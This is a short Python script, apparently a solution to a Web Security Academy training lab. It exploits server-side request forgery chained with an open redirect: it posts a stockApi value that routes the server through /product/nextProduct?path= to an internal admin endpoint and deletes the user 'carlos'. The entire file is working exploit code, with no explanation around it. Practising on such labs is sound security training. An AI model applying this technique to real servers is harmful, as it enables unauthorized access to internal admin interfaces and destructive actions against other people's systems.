import requests

site = 'acae1f2f1f2e9341c06e142d008400c7.web-security-academy.net'
stock_url = f'https://{site}/product/stock'

page = '/product/nextProduct'
parameter = 'path'
delete_url = 'http://192.168.0.12:8080/admin/delete?username=carlos'
open_redir_path = f'{page}?{parameter}={delete_url}'

stockapi_data = {
    'stockApi': open_redir_path
}
resp = requests.post(stock_url, data=stockapi_data)
print(resp.text)
